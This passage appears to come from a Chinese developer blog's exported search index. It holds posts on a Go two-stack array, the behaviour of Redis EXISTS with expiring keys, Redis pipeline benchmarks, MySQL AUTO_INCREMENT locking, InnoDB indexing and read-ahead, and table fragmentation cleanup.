stackType stackType<span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">IsFull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token boolean">false</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> stackType <span class="token operator">==</span> sLeft <span class="token punctuation">&#123;</span>      s<span class="token punctuation">.</span>arr<span class="token punctuation">[</span>s<span class="token punctuation">.</span>left<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> val      s<span class="token punctuation">.</span>left<span class="token operator">++</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      s<span class="token punctuation">.</span>arr<span class="token punctuation">[</span>s<span class="token punctuation">.</span>right<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> val      s<span class="token punctuation">.</span>right<span class="token operator">--</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Stack<span class="token punctuation">)</span> <span class="token function">Pop</span><span class="token punctuation">(</span>stackType stackType<span class="token punctuation">)</span> <span class="token punctuation">(</span>val <span class="token builtin">int</span><span class="token punctuation">,</span> exist <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> stackType <span class="token operator">==</span> sLeft <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> s<span class="token punctuation">.</span>left <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">&#123;</span>          val <span class="token operator">=</span> s<span class="token punctuation">.</span>arr<span class="token punctuation">[</span>s<span class="token punctuation">.</span>left<span class="token punctuation">]</span>          exist <span class="token operator">=</span> <span class="token boolean">true</span>          s<span class="token punctuation">.</span>left<span class="token operator">--</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> s<span class="token punctuation">.</span>right <span class="token operator">&lt;</span> maxSize <span class="token punctuation">&#123;</span>          val <span class="token operator">=</span> s<span class="token punctuation">.</span>arr<span class="token punctuation">[</span>s<span class="token punctuation">.</span>right<span class="token punctuation">]</span>          exist <span class="token operator">=</span> <span class="token boolean">true</span>          s<span class="token punctuation">.</span>right<span class="token operator">++</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token comment">// 两栈都为空</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Stack<span class="token punctuation">)</span> <span class="token function">IsEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> s<span class="token punctuation">.</span>right <span class="token operator">==</span> maxSize <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">.</span>left <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token boolean">true</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Stack<span class="token punctuation">)</span> <span class="token function">IsFull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> s<span class="token punctuation">.</span>right<span class="token operator">-</span>s<span class="token punctuation">.</span>left <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token boolean">true</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> 算法导论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis-exists有可能超出你的预期</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Redis-exists%E6%9C%89%E5%8F%AF%E8%83%BD%E8%B6%85%E5%87%BA%E4%BD%A0%E7%9A%84%E9%A2%84%E6%9C%9F/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Redis-exists%E6%9C%89%E5%8F%AF%E8%83%BD%E8%B6%85%E5%87%BA%E4%BD%A0%E7%9A%84%E9%A2%84%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<h4 id="Redis的Exists有可能超出你的预期"><a href="#Redis的Exists有可能超出你的预期" class="headerlink" title="Redis的Exists有可能超出你的预期"></a>Redis的Exists有可能超出你的预期</h4><ul><li>理论上每个key都应该有过期时间（当然也可以是一万年），通常情况下用exists来判断一个key是否存在都没什么问题（一般过期时间都比较长）。但如果过期时间需要精确到秒或十秒及，那么exists就会出乎你的意料。</li></ul><h4 id="Redis过期键删除策略"><a href="#Redis过期键删除策略" class="headerlink" title="Redis过期键删除策略"></a>Redis过期键删除策略</h4><ul><li>Redis key过期的方式有三种：</li></ul><ol><li>被动删除：当读&#x2F;写一个已经过期的key时，会触发惰性删除策略，直接删除掉这个过期key<blockquote><p>对这个key执行exists不会触发惰性删除</p></blockquote></li><li>主动删除：由于惰性删除策略无法保证冷数据被及时删掉，所以Redis会定期主动淘汰一批已过期的key</li><li>当前已用内存超过maxmemory限定时，触发主动清理策略<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_chatroom_user_tips</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> uid<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>chatroom_redis<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">"flag_key"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     value <span class="token operator">=</span> self<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>     <span class="token comment"># 间隔时间</span>     _interval <span class="token operator">=</span> <span class="token number">30</span>     <span class="token keyword">if</span> group_ids<span class="token punctuation">:</span>         self<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>setex<span class="token punctuation">(</span><span class="token string">"flag_key"</span><span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> time<span class="token operator">=</span>_interval<span class="token punctuation">)</span>         self<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> group_ids<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h6 id="上面代码存在的问题及应对方式"><a href="#上面代码存在的问题及应对方式" class="headerlink" title="上面代码存在的问题及应对方式"></a>上面代码存在的问题及应对方式</h6><p>问题</p><ul><li>redis Key在30s之后过期，但是执行exists命令的返回值可能还为True。</li><li>但是如果执行ttl命令是发现返回值为0。</li></ul><p>解决</p><ul><li>用ttl代替exists<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_chatroom_user_tips</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> uid<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> self<span class="token punctuation">.</span>chatroom_redis<span class="token punctuation">.</span>ttl<span class="token punctuation">(</span><span class="token string">"flag_key"</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>      value <span class="token operator">=</span> self<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token comment"># 间隔时间</span>      _interval <span class="token operator">=</span> <span class="token number">30</span>      <span class="token keyword">if</span> group_ids<span class="token punctuation">:</span>          self<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>setex<span class="token punctuation">(</span><span class="token string">"flag_key"</span><span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> time<span class="token operator">=</span>_interval<span class="token punctuation">)</span>          self<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> group_ids<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-自增列AUTO_INCREMENT</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E8%87%AA%E5%A2%9E%E5%88%97AUTO-INCREMENT/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E8%87%AA%E5%A2%9E%E5%88%97AUTO-INCREMENT/</url>
      
        <content type="html"><![CDATA[<h3 id="AUTO-INCREMENT"><a href="#AUTO-INCREMENT" class="headerlink" title="AUTO_INCREMENT"></a>AUTO_INCREMENT</h3><h6 id="两种情况"><a href="#两种情况" class="headerlink" title="两种情况"></a>两种情况</h6><p>1、在载入语句执行前，已经<strong>不确定</strong>要插入多少条记录。</p><ul><li>在执行插入语句时在&#x3D;&#x3D;表级别&#x3D;&#x3D;加一个&#x3D;&#x3D;auto-inc锁&#x3D;&#x3D;，然后为每条待插入记录的auto-increment修饰的列分配递增的值，语句执行结束后，再把auto-inc锁释放掉。一个事务再持有auto-inc锁的过程中，其他事务的插入语句都要被阻塞，可以保证一个语句中分配的递增值是连续的。<blockquote><p>AUTO-INC锁的作用范围只是单个插入语句，插入语句执行完成后，这个锁就被释放了，跟我们之前介绍的锁在事务结束时释放是不一样的。</p></blockquote></li></ul><p>2、插入语句执行前就<strong>确定</strong>要插入多少条记录。</p><ul><li>采用一个轻量级的锁，在为插入语句生成auto-increment修饰的列的值时获取一下这个轻量级锁，生成需要用到的auto-increment列的值后，&#x3D;&#x3D;立马释放&#x3D;&#x3D;，不需要等语句执行。<blockquote><p>InnoDB中提供系统变量 innodb_autoinc_lock_mode 控制用以上哪种方式进行自增的赋值。</p><ol><li>innodb_autoinc_lock_mode&#x3D;0 一律采用auto-inc锁。</li><li>innodb_autoinc_lock_mode&#x3D;2 一律采用轻量级锁。</li><li>innodb_autoinc_lock_mode&#x3D;1 混着来，插入记录数量确定时采用轻量级锁，不确定时使用AUTO-INC锁。</li></ol><p>当一律采用轻量级锁时，可能会造成不同事物中插入语句生成的值时交叉的，在有主从复制的场景中是不安全的。</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis-两次redis操作用不用pipeline</title>
      <link href="/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-03-07-Redis-%E4%B8%A4%E6%AC%A1redis%E6%93%8D%E4%BD%9C%E7%94%A8%E4%B8%8D%E7%94%A8pipeline/"/>
      <url>/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-03-07-Redis-%E4%B8%A4%E6%AC%A1redis%E6%93%8D%E4%BD%9C%E7%94%A8%E4%B8%8D%E7%94%A8pipeline/</url>
      
        <content type="html"><![CDATA[<h4 id="为什么需要-pipeline-？"><a href="#为什么需要-pipeline-？" class="headerlink" title="为什么需要 pipeline ？"></a>为什么需要 pipeline ？</h4><ul><li>正常情况下，客户端发送一个命令，等待 Redis 应答；Redis 接收到命令，处理后应答。请求发出到响应的时间叫做往返时间，即 RTT（Round Time Trip）。在这种情况下，如果需要执行大量的命令，就需要等待上一条命令应答后再执行。这中间不仅仅多了许多次 RTT，而且还频繁的调用系统 IO，发送网络请求。</li><li>pipeline 允许客户端可以一次发送多条命令，而不等待上一条命令执行的结果。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9iVlY5MTY?x-oss-process=image/format,png" alt="在这里插入图片描述"></li></ul><h4 id="两次redis操作，用pipeline会不会好一点"><a href="#两次redis操作，用pipeline会不会好一点" class="headerlink" title="两次redis操作，用pipeline会不会好一点"></a>两次redis操作，用pipeline会不会好一点</h4><ul><li>执行10万次set<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> redis<span class="token keyword">import</span> time<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  my_redis <span class="token operator">=</span> redis<span class="token punctuation">.</span>StrictRedis<span class="token punctuation">(</span>connection_pool<span class="token operator">=</span>redis<span class="token punctuation">.</span>ConnectionPool<span class="token punctuation">.</span>from_url<span class="token punctuation">(</span><span class="token string">"redis://:@127.0.0.1/0"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> socket_timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># 不用pipeline</span>  start_time <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      key1 <span class="token operator">=</span> <span class="token string">"test1_%s"</span> <span class="token operator">%</span> i      my_redis<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>key1<span class="token punctuation">,</span> i<span class="token punctuation">)</span>      my_redis<span class="token punctuation">.</span>expire<span class="token punctuation">(</span>key1<span class="token punctuation">,</span> <span class="token number">3600</span><span class="token punctuation">)</span>  end_time <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>  <span class="token keyword">print</span> end_time <span class="token operator">-</span> start_time  <span class="token comment"># 使用pipeline</span>  start_time <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>  pipe <span class="token operator">=</span> my_redis<span class="token punctuation">.</span>pipeline<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      key1 <span class="token operator">=</span> <span class="token string">"test2_%s"</span> <span class="token operator">%</span> i      pipe<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>key1<span class="token punctuation">,</span> i<span class="token punctuation">)</span>      pipe<span class="token punctuation">.</span>expire<span class="token punctuation">(</span>key1<span class="token punctuation">,</span> <span class="token number">3600</span><span class="token punctuation">)</span>  pipe<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">)</span>  end_time <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>  <span class="token keyword">print</span> end_time <span class="token operator">-</span> start_time<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>执行结果<blockquote><p>16651、14477、15041 # 不用pipeline<br>4517、4158、4325  # 使用pipeline</p></blockquote></li><li>初步结论<blockquote><p>即使只有两次redis操作，pipeline的效果也很突出。</p></blockquote></li></ul><h4 id="两次已经表现优异了，次数多点怎么样？"><a href="#两次已经表现优异了，次数多点怎么样？" class="headerlink" title="两次已经表现优异了，次数多点怎么样？"></a>两次已经表现优异了，次数多点怎么样？</h4><ul><li><p>执行100万次sadd 操作</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">start_time <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      key1 <span class="token operator">=</span> <span class="token string">"test1_%s_%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>      my_redis<span class="token punctuation">.</span>sadd<span class="token punctuation">(</span>key1<span class="token punctuation">,</span> i<span class="token punctuation">)</span>  my_redis<span class="token punctuation">.</span>expire<span class="token punctuation">(</span>key1<span class="token punctuation">,</span> <span class="token number">3600</span><span class="token punctuation">)</span>end_time <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token keyword">print</span> end_time <span class="token operator">-</span> start_timestart_time <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>pipe <span class="token operator">=</span> my_redis<span class="token punctuation">.</span>pipeline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      key1 <span class="token operator">=</span> <span class="token string">"test2_%s_%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>      pipe<span class="token punctuation">.</span>sadd<span class="token punctuation">(</span>key1<span class="token punctuation">,</span> i<span class="token punctuation">)</span>  pipe<span class="token punctuation">.</span>expire<span class="token punctuation">(</span>key1<span class="token punctuation">,</span> <span class="token number">3600</span><span class="token punctuation">)</span>pipe<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">)</span>end_time <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token keyword">print</span> end_time <span class="token operator">-</span> start_time<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>执行结果</p><blockquote><p>83849<br>26313</p></blockquote></li><li><p>初步结论</p><blockquote><p>pipeline居家必备</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 中间件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Emotions</title>
      <link href="/uncatesgorized/2021-07-16-Emoticons/"/>
      <url>/uncatesgorized/2021-07-16-Emoticons/</url>
      
        <content type="html"><![CDATA[<p>图片</p><ul><li>黑人问号</li></ul><p><img src="https://i.loli.net/2021/07/16/zLr4R9OBxoVdsGw.jpg" alt="e18d20c94006dfe0-9eef65073f0f6be0-d9c854df534cf3bd0dca74a7e620249c.jpeg"></p><ul><li>原来如此</li></ul><p><img src="https://i.loli.net/2021/07/16/q5s324OFgVGv6wz.jpg" alt="0c1c538af9ca1f83.jpg"></p><p><img src="https://i.loli.net/2021/07/16/GSqV1EBar9mKODA.jpg" alt="c027e07480e9f367.jpg"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-索引与算法</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E7%B4%A2%E5%BC%95%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E7%B4%A2%E5%BC%95%E4%B8%8E%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h3 id="B-树索引的管理"><a href="#B-树索引的管理" class="headerlink" title="B+树索引的管理"></a>B+树索引的管理</h3><ul><li><p>创建索引</p><p>对于索引的添加或删除，MySQL先创建一张临时表，把数据导入临时表，删除原表，然后把临时表重命名为原来的表。因此大表创建和删除索引的时间非常长。</p><p>快速索引创建法：对于非聚集索引的创建，InnoDB会对表加S锁，创建过程中只能读，不能写。</p></li></ul><h3 id="B-树索引的使用"><a href="#B-树索引的使用" class="headerlink" title="B+树索引的使用"></a>B+树索引的使用</h3><ul><li><p>顺序读</p><p>顺序的读取磁盘上的块</p></li><li><p>随机读</p><p>访问的块不连续，需要磁头不断移动</p></li><li><p>预读取</p><p>通过一次I&#x2F;O请求多个页预读到缓冲池中，并且估计预读的多个页马上会被访问。传统I&#x2F;O请求每次只读取一个页，在传统机械硬盘较低的IOPS下，预读计数可以大大提高读取的性能。</p><blockquote><ol><li><p>随机预读</p><p>当一个区中&#x3D;&#x3D;13&#x3D;&#x3D;个页在缓冲区中，并在LRU列表的前端，则InnoDB存储引擎会将这个区中剩余的所有页都预读到缓冲区。</p><p>InnoDB Plugin 1.0.4开始，随机预读被取消。</p></li><li><p>线性预读</p><p>基于缓冲池中页的访问模式，而不是数量。如果一个区中的N个页都被顺序的访问了，则InnoDB会读取下一个区的所有页。</p><p>N的值由<code>innodb_read_ahead_threshold</code>控制，默认值56。</p></li></ol></blockquote></li></ul><h3 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h3><ul><li><p>InnoDB中的哈希算法</p><p>InnoDB使用哈希算法对字典进行查找，采用链表方式解决冲突、哈希函数采用除法散列方式（ &#x3D;&#x3D;h(k)&#x3D;k mod m&#x3D;&#x3D; ）。</p><p>缓冲池中的Page页都有一个chain指针，指向相同哈希函数值的页。</p><p>除法散列，m的取值为略大于2倍的缓冲池页数量的质素。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-碎片整理遇到的那些事</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E7%A2%8E%E7%89%87%E6%95%B4%E7%90%86%E9%81%87%E5%88%B0%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E7%A2%8E%E7%89%87%E6%95%B4%E7%90%86%E9%81%87%E5%88%B0%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="为什么要碎片整理"><a href="#为什么要碎片整理" class="headerlink" title="为什么要碎片整理"></a>为什么要碎片整理</h3><ul><li>MySQL中使用varchar、text、blob等可变长度的文本数据类型之后需要做额外的MySQL数据表碎片整理。</li><li>当MySQL从表中删除一行内容，该段空间就会被留空。如果有大量的删除操作，会使留空空间变得比存储列表内容所使用的空间更大。</li><li>MySQL进行数据扫描时，它扫描的对象实际是列表的容量需求上限，也就是数据被写入的区域中处于峰值位置的部分。如果进行新的插入操作，MySQL将尝试利用这些留空的区域，但仍然无法将其彻底占用。</li></ul><h3 id="碎片查看及整理"><a href="#碎片查看及整理" class="headerlink" title="碎片查看及整理"></a>碎片查看及整理</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name<span class="token punctuation">,</span><span class="token keyword">engine</span><span class="token punctuation">,</span>table_rows<span class="token punctuation">,</span>data_length<span class="token punctuation">,</span>index_length<span class="token punctuation">,</span>DATA_FREE <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> TABLE_NAME<span class="token operator">=</span><span class="token string">'chat_msgs'</span><span class="token punctuation">;</span><span class="token keyword">optimize</span> <span class="token keyword">table</span> chat_msgs<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200420224821232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200420224845211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="information-schema-tables"><a href="#information-schema-tables" class="headerlink" title="information_schema.tables"></a>information_schema.tables</h3><ul><li>show create table information_schema.tables;</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TEMPORARY</span> <span class="token keyword">TABLE</span> <span class="token identifier"><span class="token punctuation">`</span>TABLES<span class="token punctuation">`</span></span> <span class="token punctuation">(</span>  <span class="token identifier"><span class="token punctuation">`</span>TABLE_CATALOG<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token string">''</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>TABLE_SCHEMA<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token string">''</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>TABLE_NAME<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token string">''</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>TABLE_TYPE<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token string">''</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>ENGINE<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>VERSION<span class="token punctuation">`</span></span> <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>ROW_FORMAT<span class="token punctuation">`</span></span> <span 